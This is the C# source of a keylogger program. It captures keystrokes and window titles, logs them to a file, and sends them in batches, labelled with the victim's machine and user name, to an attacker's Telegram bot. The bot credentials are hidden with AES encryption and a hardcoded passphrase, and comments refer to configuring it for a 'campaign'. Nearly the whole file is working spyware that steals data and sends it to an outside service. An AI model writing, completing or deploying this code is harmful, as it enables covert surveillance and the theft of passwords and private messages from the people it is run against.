using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SimpleKeylogger
{
    class Program
    {
        private static readonly HttpClient _http = new();
        private static readonly ConcurrentQueue<string> _batch = new();
        private static readonly object _sendLock = new();
        private static int _lineCount;
        private static string _logPath = null!;

        // --- ENCRYPTED CREDENTIALS (AES-256-CBC, Base64) ---
        // Generate with: encrypt.exe YOUR_BOT_TOKEN YOUR_CHAT_ID
        private const string EncryptedBotToken = "cTrxzJZMRMQBeuKwYfrS2JVki04ZEhk9yorJxDiWh5PKu2hIk70afqf6KoHT1YdG";
        private const string EncryptedChatId = "bLyRAKoA04Mvvi+qDhvu9A==";

        private static readonly string _botToken;
        private static readonly string _chatId;
        private const int BatchSize = 100;

        // Static constructor decrypts credentials once at startup
        static Program()
        {
            _botToken = DecryptString(EncryptedBotToken);
            _chatId = DecryptString(EncryptedChatId);
        }

        static async Task Main(string[] args)
        {
            Console.WriteLine("=== Keylogger Started (Telegram every 100 lines) ===");
            Console.WriteLine("Press ESC to stop\n");

            _logPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "keystrokes.log");
            using var logger = new Keylogger();

            logger.KeyCaptured += (_, e) =>
            {
                if (string.IsNullOrEmpty(e.Text))
                    return;

                var line = $"{e.Timestamp:HH:mm:ss} | {e.WindowTitle.Truncate(40)} | {e.Text}";

                File.AppendAllText(_logPath, line + "\n");
                Console.Write(e.Text);

                _batch.Enqueue(line);
                int count = Interlocked.Increment(ref _lineCount);

                if (count >= BatchSize)
                {
                    _ = FlushBatchAsync();
                }
            };

            logger.Start(args =>
            {
                if (args.Text == "[Escape]")
                {
                    Console.WriteLine("\nEscape pressed. Sending final batch...");
                    FlushBatchAsync().GetAwaiter().GetResult();
                    logger.Stop();
                }
            });

            while (true)
            {
                Thread.Sleep(100);
            }
        }

        // --------------- Encryption/Decryption ---------------
        private static readonly byte[] _salt = new byte[] 
        { 
            0x4A, 0x8F, 0x2E, 0xC1, 0x9D, 0x3B, 0x7F, 0x55,
            0xE2, 0xA8, 0x0C, 0xD4, 0x6B, 0x91, 0x3E, 0x7C 
        };

        private static readonly byte[] _iv = new byte[]
        {
            0x1C, 0x8E, 0x4A, 0x2F, 0x9D, 0x6B, 0x3F, 0x7E,
            0xC2, 0xA1, 0x5D, 0x8B, 0xE4, 0x3C, 0x7A, 0x9F
        };

        private static string DecryptString(string cipherText)
        {
            byte[] cipherBytes = Convert.FromBase64String(cipherText);
            
            byte[] key = Rfc2898DeriveBytes.Pbkdf2(
                Encoding.UTF8.GetBytes(GetPassphrase()), 
                _salt, 
                100000, 
                HashAlgorithmName.SHA256, 
                32);
            
            using var aes = Aes.Create();
            aes.Key = key;
            aes.IV = _iv;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            using var decryptor = aes.CreateDecryptor();
            byte[] plainBytes = decryptor.TransformFinalBlock(cipherBytes, 0, cipherBytes.Length);
            
            return Encoding.UTF8.GetString(plainBytes);
        }

        private static string GetPassphrase()
        {
            // Hardcoded — same on all machines.
            // Change this to something unique for your campaign.
            return "My$ecure!Campaign2024#Key";
        }

        // --------------- Telegram Send ---------------
        private static async Task FlushBatchAsync()
        {
            if (!Monitor.TryEnter(_sendLock))
                return;

            try
            {
                Interlocked.Exchange(ref _lineCount, 0);

                var lines = new List<string>();
                while (_batch.TryDequeue(out var line))
                    lines.Add(line);

                if (lines.Count == 0)
                    return;

                var plain = new StringBuilder();
                plain.AppendLine($"--- {DateTime.UtcNow:yyyy-MM-dd HH:mm:ss} UTC ---");
                foreach (var l in lines)
                    plain.AppendLine(l);

                await SendAsDocument(plain.ToString(), lines.Count);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"\n[Telegram error: {ex.Message}]");
            }
            finally
            {
                Monitor.Exit(_sendLock);
            }
        }

        private static async Task SendAsDocument(string content, int lineCount)
        {
            string machine = Environment.MachineName;
            string user = Environment.UserName;
            string timestamp = DateTime.UtcNow.ToString("yyyyMMdd_HHmmss");
            string fileName = $"{machine}_{user}_{timestamp}.txt";
            
            using var fileContent = new ByteArrayContent(Encoding.UTF8.GetBytes(content));
            fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("text/plain");

            using var formData = new MultipartFormDataContent();
            formData.Add(new StringContent(_chatId), "chat_id");
            formData.Add(new StringContent($"[{machine}\\{user}] {lineCount} keystrokes"), "caption");
            formData.Add(fileContent, "document", fileName);

            var response = await _http.PostAsync(
                $"https://api.telegram.org/bot{_botToken}/sendDocument", formData);

            if (response.IsSuccessStatusCode)
                Console.WriteLine($"\n[Sent {lineCount} lines to Telegram as {fileName}]");
            else
                Console.WriteLine($"\n[Telegram send failed: {response.StatusCode}]");
        }
    }

    internal static class StringExtensions
    {
        public static string Truncate(this string value, int maxLength) =>
            value.Length <= maxLength ? value : value[..(maxLength - 3)] + "...";
    }
}